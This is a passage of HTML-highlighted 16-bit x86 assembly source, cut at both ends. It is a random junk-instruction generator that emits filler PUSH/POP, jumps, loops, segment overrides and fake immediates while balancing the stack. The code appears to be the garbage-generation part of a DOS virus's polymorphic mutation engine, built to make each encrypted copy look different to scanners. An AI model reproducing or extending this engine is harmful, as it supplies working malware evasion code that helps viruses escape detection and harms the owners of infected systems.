        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; pop word reg</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_1_word</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_2_word</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_0_word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">; push word</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_1_word</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_2_word</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; can be used conversion b-&gt;W ?</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C483h</span><span class="sc0">  </span><span class="sc1">; add sp, word #</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">use_add_sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">    </span><span class="sc1">; sub sp, word #</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">use_add_sp</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_conversion</span><span class="sc0">   </span><span class="sc1">; without conversion</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_word</span><span class="sc0">  </span><span class="sc1">; use conversion</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmpwritebyte</span><span class="sc0">

</span><span class="sc5">no_conversion</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; without conversion</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_word</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">jmp2jmpwritewor</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_write_word</span><span class="sc0">

</span><span class="sc5">clear_2_word</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_POP</span><span class="sc0">

</span><span class="sc5">clear_1_word</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_POP</span><span class="sc0">

</span><span class="sc5">clear_0_word</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">check_POP</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; returns 0 to 7</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Ch</span><span class="sc0">     </span><span class="sc1">; POP SP  ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jmpwritebyte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; xchange for POP DI</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmpwritebyte</span><span class="sc0">


</span><span class="sc5">JCND_LOOP_JSRT</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">this_is_enabled</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">locret_0_8C8</span><span class="sc0">    </span><span class="sc1">;  !=0 -&gt; exit</span><span class="sc0">

</span><span class="sc5">this_is_enabled</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">    </span><span class="sc1">; jmp short</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jmp_short</span><span class="sc0">   </span><span class="sc1">; is generaded if ax=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; loop/loope/loopne/jcxz is</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; is generated 0&lt;AX&lt;5</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">jmp_short</span><span class="sc0">   </span><span class="sc1">; in all other cases</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">     </span><span class="sc1">; cond jumps</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">jmp_short</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">      </span><span class="sc1">; set lenght of jmp/loop to 0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; pop caller</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; push pointer to next byte</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; restore pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; push caller back</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2jmpwritewor</span><span class="sc0">

</span><span class="sc5">stact_biz</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_stack</span><span class="sc0">

</span><span class="sc5">locret_0_8C8</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">prepare_stack</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">where_2_jump</span><span class="sc0"> </span><span class="sc1">; pop return adress</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; pop adress of caller's caller</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; save pointer to next generated</span><span class="sc0">
                    </span><span class="sc1">; instruction</span><span class="sc0">

</span><span class="sc5">prepare_stack1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; pop 1st stack variable</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">skip_generation</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; pop 2nd stack variable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">stack_wtch_0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clear_stack</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_0_8F9</span><span class="sc0">


</span><span class="sc5">stack_wtch_0</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">loc_0_8F9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">loc_0_8F9</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">loc_0_917</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loc_0_915</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">loc_0_917</span><span class="sc0">

</span><span class="sc5">loc_0_915</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">loc_0_917</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">prepare_stack1</span><span class="sc0">


</span><span class="sc5">skip_generation</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; MOV AX, word</span><span class="sc0">
</span><span class="sc5">where_2_jump</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">MOV_POP_MEM</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_seg_overrid</span><span class="sc0"> </span><span class="sc1">; mov memory,AX/L, POP memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">gen_POP_memory</span><span class="sc0">

</span><span class="sc5">_MOV_m_ALAX</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0">    </span><span class="sc1">; generate  MOV mem,AL/AX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2adr2write</span><span class="sc0">


</span><span class="sc5">gen_POP_memory</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">_MOV_m_ALAX</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">     </span><span class="sc1">; POP r/m</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110b</span><span class="sc0">    </span><span class="sc1">; displacement 16 bytes</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2adr2write</span><span class="sc0">

</span><span class="sc5">LG_ARI_MOV_8bit</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_seg_overrid</span><span class="sc0"> </span><span class="sc1">; generate segment override</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">gr_lg_artm_mov</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">write_generated</span><span class="sc0">

</span><span class="sc5">GRP1_to_GRP3</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_seg_overrid</span><span class="sc0"> </span><span class="sc1">; generate segment override</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">grp1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; Grp2 or Grp3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000b</span><span class="sc0">   </span><span class="sc1">; clear mod, reg=001, r/m=0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110b</span><span class="sc0">    </span><span class="sc1">; displacement 16 bit !</span><span class="sc0">

</span><span class="sc5">jmp2adr2write</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">adress_2_write</span><span class="sc1">; if we write 2 memory, this 'll select correct adress</span><span class="sc0">


</span><span class="sc5">grp1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000b</span><span class="sc0">   </span><span class="sc1">; clear mod, r/m, set reg &amp;&amp;= 001</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10110b</span><span class="sc0">  </span><span class="sc1">; 16 bit displacement</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">adress_2_write</span><span class="sc1">; if we write 2 memory, this 'll select correct adress</span><span class="sc0">


</span><span class="sc5">grp_MEM_MEM_iMM</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_seg_overrid</span><span class="sc0"> </span><span class="sc1">; generate segment override</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_10h</span><span class="sc0"> </span><span class="sc1">; returns 0 - F</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; Grp1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">put_GRP1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">    </span><span class="sc1">; MOV mem,imm8 or imm16</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">put_GRP1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; ArOp1 or ArOp2 r/m,imm8 or 16</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_40h</span><span class="sc0"> </span><span class="sc1">; returns 0 - 3F</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; set r/m to 7</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; r/m = 6 -&gt; 16bit displacement</span><span class="sc0">

</span><span class="sc5">add_adr_in_mem</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">adress_2_write</span><span class="sc0">  </span><span class="sc1">; if we write 2 memory, this 'll select correct adress</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; add fake immediate</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jmp_2_rnd_word</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rnd_byte</span><span class="sc0">


</span><span class="sc5">jmp_2_rnd_word</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rnd_word</span><span class="sc0">


</span><span class="sc5">put_GRP1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; byte or word in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; 16 bit displacement</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">add_adr_in_mem</span><span class="sc0">


</span><span class="sc5">ROTATIONS</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
